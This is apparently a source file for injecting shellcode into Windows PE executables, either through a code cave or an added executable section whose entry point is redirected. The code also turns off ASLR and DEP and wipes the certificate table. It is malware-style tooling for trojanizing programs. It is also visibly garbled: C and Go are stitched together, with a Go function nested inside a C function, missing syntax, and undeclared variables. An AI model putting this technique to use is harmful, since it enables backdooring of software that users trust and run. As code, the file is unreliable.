int binject_PE(char *file,char *shellcode,int method)
{
	PIMAGE_DOS_HEADER dos = (struct PIMAGE_DOS_HEADER *)address;
	
  if(method==CODE_CAVE)
  {
	  
	address+=dos->e_elfanew
	PIMAGE_NT_HEADERS nt = (struct PIMAGE_NT_HEADERS *)address;
	address+= sizeof(IMAGE_NT_HEADERS);
		for(int i=0;i<nt->FileHeader.NumberOfSections;i++) {
			PIMAGE_SECTION_HEADER section= (struct PIMAGE_SECTION_HEADER*)address;
			if(section->characteristics&pe.IMAGE_SCN_MEM_EXECUTE != 0 { 
				uint32_t section_start=section->PointerToRawData;
				uint32_t section_end=section_start+section->SizeOfRawData;
				
			        sclen+=5;
				int x=find_code_cave(sclen,section_start,section_end,file_buffer);
				if(x!=0)
				{ 
					char *shellcodefixed =ApplySuffixJmpIntel64(shellcodeBytes, uint32(scAddr), uint32(entryPoint), binary.LittleEndian);
					memcpy(file_buffer+x,shellcodefixed,sclen);
					fwrite(file_buffer,1,size,f);
					free(shellcodefixed);
					free(file_buffer);
					fclose(f);
					return 0;
				}		
					address+=section.SizeOfRawData;	
				                                                   }
				                                 }
   }
			   
  if(method==NEW_SECTION)
  {
  int align(size, align, addr uint32) uint32 {
	if 0 == (size % align) {
		return addr + size
	}
	return addr + (size/align+1)*align
}
 
uint32_t size;
 lastSection = peFile.Sections[peFile.NumberOfSections-1]
  FILE *f;
  f=fopen(file,"r");
  fseek(f,0,SEEK_END);
 size=ftell(f);
  char *file_buffer = calloc(1,size);
	int sclen=strlen(shellcode);
   PeBinject - Inject shellcode into an PE binary
func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig) ([]byte, error) {
	var entryPoint, sectionAlignment, fileAlignment, scAddr uint32
	var imageBase uint64
	var shellcode []byte
	lastSection := peFile.Sections[peFile.NumberOfSections-1]

	switch (peFile.OptionalHeader).(type) {
	case *pe.OptionalHeader32:
		imageBase = uint64(hdr.ImageBase) // cast this back to a uint32 before use in 32bit
		entryPoint = hdr.AddressOfEntryPoint
		sectionAlignment = hdr.SectionAlignment
		fileAlignment = hdr.FileAlignment
		scAddr = align(lastSection.Size, fileAlignment, lastSection.Offset) //PointerToRawData
		shellcode = api.ApplySuffixJmpIntel32(shellcodeBytes, scAddr, entryPoint+uint32(imageBase), binary.LittleEndian)
		break
	case *pe.OptionalHeader64:
		imageBase = hdr.ImageBase
		entryPoint = hdr.AddressOfEntryPoint
		sectionAlignment = hdr.SectionAlignment
		fileAlignment = hdr.FileAlignment
		scAddr = align(lastSection.Size, fileAlignment, lastSection.Offset) //PointerToRawData
		shellcode = api.ApplySuffixJmpIntel32(shellcodeBytes, scAddr, entryPoint+uint32(imageBase), binary.LittleEndian)
		break
	}

	// Add a New Section Method (most common)
	shellcodeLen := len(shellcode)
	newsection := new(pe.Section)
	newsection.Name = "." + RandomString(5)
	o := []byte(newsection.Name)
	newsection.OriginalName = [8]byte{o[0], o[1], o[2], o[3], o[4], o[5], 0, 0}
	newsection.VirtualSize = uint32(shellcodeLen)
	newsection.VirtualAddress = align(lastSection.VirtualSize, sectionAlignment, lastSection.VirtualAddress)
	newsection.Size = align(uint32(shellcodeLen), fileAlignment, 0)                //SizeOfRawData
	newsection.Offset = align(lastSection.Size, fileAlignment, lastSection.Offset) //PointerToRawData
	newsection.Characteristics = pe.IMAGE_SCN_CNT_CODE | pe.IMAGE_SCN_MEM_EXECUTE | pe.IMAGE_SCN_MEM_READ

	peFile.InsertionAddr = scAddr
	peFile.InsertionBytes = shellcode

	switch hdr := (peFile.OptionalHeader).(type) {
	case *pe.OptionalHeader32:
		v = newsection.VirtualSize
		if v == 0 {
			v = newsection.Size // SizeOfRawData
		}
		hdr.SizeOfImage = align(v, sectionAlignment, newsection.VirtualAddress)
		hdr.AddressOfEntryPoint = newsection.VirtualAddress
		hdr.CheckSum = 0
		// disable ASLR
		hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		hdr.DataDirectory[5].VirtualAddress = 0
		hdr.DataDirectory[5].Size = 0
		peFile.FileHeader.Characteristics |= pe.IMAGE_FILE_RELOCS_STRIPPED
		//disable DEP
		hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_NX_COMPAT
		// zero out cert table offset and size
		hdr.DataDirectory[4].VirtualAddress = 0
		hdr.DataDirectory[4].Size = 0
		break
	case *pe.OptionalHeader64:
		v = newsection.VirtualSize
		if v == 0 {
			v = newsection.Size // SizeOfRawData
		}
		hdr.SizeOfImage = align(v, sectionAlignment, newsection.VirtualAddress)
		hdr.AddressOfEntryPoint = newsection.VirtualAddress
		hdr.CheckSum = 0
		// disable ASLR
		hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		hdr.DataDirectory[5].VirtualAddress = 0
		hdr.DataDirectory[5].Size = 0
		peFile.FileHeader.Characteristics |= pe.IMAGE_FILE_RELOCS_STRIPPED
		//disable DEP
		hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_NX_COMPAT
		// zero out cert table offset and size
		hdr.DataDirectory[4].VirtualAddress = 0
		hdr.DataDirectory[4].Size = 0
		break
	}

	peFile.FileHeader.NumberOfSections++
	peFile.Sections = append(peFile.Sections, newsection)

	return peFile.Bytes()
}
}
    
    
    
    
    
  }
  free(file_buffer);  
}
